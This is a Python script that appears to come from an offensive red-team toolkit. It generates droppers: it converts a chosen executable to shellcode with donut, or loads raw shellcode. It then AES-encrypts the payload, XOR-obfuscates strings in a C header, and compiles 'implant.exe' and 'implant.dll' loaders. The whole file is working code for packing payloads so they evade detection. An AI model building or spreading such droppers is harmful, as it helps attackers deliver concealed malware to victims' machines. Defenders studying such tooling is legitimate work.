import sys, getopt
from Crypto.Cipher import AES
import os
from os import urandom
import hashlib
import random
import string
import subprocess
from pathlib import Path


characters = string.ascii_letters + string.digits
password = ''.join(random.choice(characters) for i in range(16))


KEY_XOR = password.replace('"','-').replace('\'','-')
KEY_AES = urandom(16)


def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size).encode('ISO-8859-1')


def aesenc(plaintext, key):
	k = hashlib.sha256(key).digest()
	iv = 16 * b'\x00'
	plaintext = pad(plaintext)    
	cipher = AES.new(k , AES.MODE_CBC, iv)
	output = cipher.encrypt(plaintext)
	return output


def xor(data, key):
	
	key = str(key)
	l = len(key)
	output_str = ""

	for i in range(len(data)):
		current = data[i]
		current_key = key[i % len(key)]
		output_str += chr(ord(current) ^ ord(current_key))
	
	return output_str


def printCiphertext(ciphertext):
	return '{ (char)0x' + ', (char)0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' }'


def generatePayloads(binary, binaryArgs, rawShellCode):
        if binary:
                print('binary ', binary)
                print('binaryArgs ', binaryArgs)
                print('')
                if os.name == 'nt':
                        donutBinary = os.path.join(Path(__file__).parent, '.\\ressources\\donut.exe')
                        shellcodePath = os.path.join(Path(__file__).parent, '.\\bin\\dropper.bin')
                        args = (donutBinary, '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', shellcodePath, binary)
                else:   
                        donutBinary = os.path.join(Path(__file__).parent, './ressources/donut')
                        shellcodePath = os.path.join(Path(__file__).parent, './bin/dropper.bin')
                        args = (donutBinary, '-f', '1', '-m', 'go', '-p', binaryArgs, '-o', shellcodePath, '-i' , binary)
                popen = subprocess.Popen(args, stdout=subprocess.PIPE)
                popen.wait()
                output = popen.stdout.read()
                
                print("[+] Generate shellcode of payload with donut")
                print(output.decode("utf-8") )

                shellcode = open(shellcodePath, "rb").read()

        elif rawShellCode:
                print('rawShellCode ', rawShellCode)
                print('')

                shellcode = open(rawShellCode, "rb").read()

        if os.name == 'nt':
                fileEncryptPath = os.path.join(Path(__file__).parent, '.\\bin\\cryptDef.h')
                fileEncrypt = open(fileEncryptPath, 'w')
        else:
                fileEncryptPath = os.path.join(Path(__file__).parent, './bin/cryptDef.h')
                fileEncrypt = open(fileEncryptPath, 'w')

        fileClearPath = os.path.join(Path(__file__).parent, 'clearDef.h')
        fileClear = open(fileClearPath, 'r')

        Lines = fileClear.readlines()

        AesBlock=False;
        XorBlock=False;
        # Strips the newline character
        for line in Lines:
                #print(line)

                if(XorBlock):
                        words = line.split('"')
                        if(len(words)>=3):
                                if("XorKey" in words[0]):
                                        words[1]= KEY_XOR
                                        line ='"'.join(words)

                                else:
                                        plaintext=words[1]
                                        ciphertext = xor(plaintext, KEY_XOR)
                                        
                                        words[1]= printCiphertext(ciphertext)
                                        line =''.join(words)

                if(AesBlock):
                        words = line.split('"')
                        if(len(words)>=3):
                                if("AesKey" in words[0]):
                                        words[1]= printCiphertext(KEY_AES.decode('ISO-8859-1'))
                                        line =''.join(words)

                                elif("payload" in words[0]):
                                        plaintext = shellcode
                                        ciphertext = aesenc(plaintext, KEY_AES)
                                        
                                        words[1]= printCiphertext(ciphertext.decode('ISO-8859-1'))
                                        line =''.join(words)

                if(line == "// TO XOR\n"):
                        XorBlock=True;
                        AesBlock=False;
                elif(line == "// TO AES\n"):
                        AesBlock=True;
                        XorBlock=False;

                fileEncrypt.writelines(line)

        fileEncrypt.close()

        print("[+] Compile dropper with shellcode")
        if os.name == 'nt':
                compileScript = os.path.join(Path(__file__).parent, '.\\compile.bat')
                args = compileScript.split()
        else:   
                compileScript = os.path.join(Path(__file__).parent, './compile.sh')
                args = compileScript.split()
        popen = subprocess.Popen(args, stdout=subprocess.PIPE, cwd=Path(__file__).parent)
        popen.wait()
        output = popen.stdout.read()
        print(output.decode("utf-8") )

        if os.name == 'nt':
                dropperExePath = os.path.join(Path(__file__).parent, 'bin\\implant.exe')
                dropperDllPath = os.path.join(Path(__file__).parent, 'bin\\implant.dll')
        else:
                dropperExePath = os.path.join(Path(__file__).parent, 'bin/implant.exe')
                dropperDllPath = os.path.join(Path(__file__).parent, 'bin/implant.dll')

        if not os.path.isfile(dropperExePath):
                print("[+] Error: Dropper EXE file don't exist")
                return "", ""

        if not os.path.isfile(dropperDllPath):
                print("[+] Error: Dropper DLL file don't exist")
                return "", ""

        print("[+] Done")

        return dropperExePath, dropperDllPath


def main(argv):

        if(len(argv)<2):
                print ('On Windows:\nGenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
                print ('On linux:\nGenerateDropperBinary.py -b ./calc.exe -a "some args"')
                exit()

        binary=""
        binaryArgs=""
        rawShellCode=""

        opts, args = getopt.getopt(argv,"hb:a:r:",["binary=","args="])
        for opt, arg in opts:
                if opt == '-h':
                        print ('On Windows:\nGenerateDropperBinary.py -b C:\\Windows\\System32\\calc.exe -a "some args"')
                        print ('On linux:\nGenerateDropperBinary.py -b ./calc.exe -a "some args"')
                        sys.exit()
                elif opt in ("-b", "--binary"):
                        binary = arg
                elif opt in ("-a", "--args"):
                        binaryArgs = arg
                elif opt == '-r':
                        rawShellCode = arg
        
        print('[+] Generate dropper for params:')
        print('binary ', binary)
        print('binaryArgs ', binaryArgs)
        print('')

        dropperExePath, dropperDllPath = generatePayloads(binary, binaryArgs, rawShellCode)

        print(dropperExePath)
        print(dropperDllPath)


if __name__ == "__main__":
    main(sys.argv[1:])

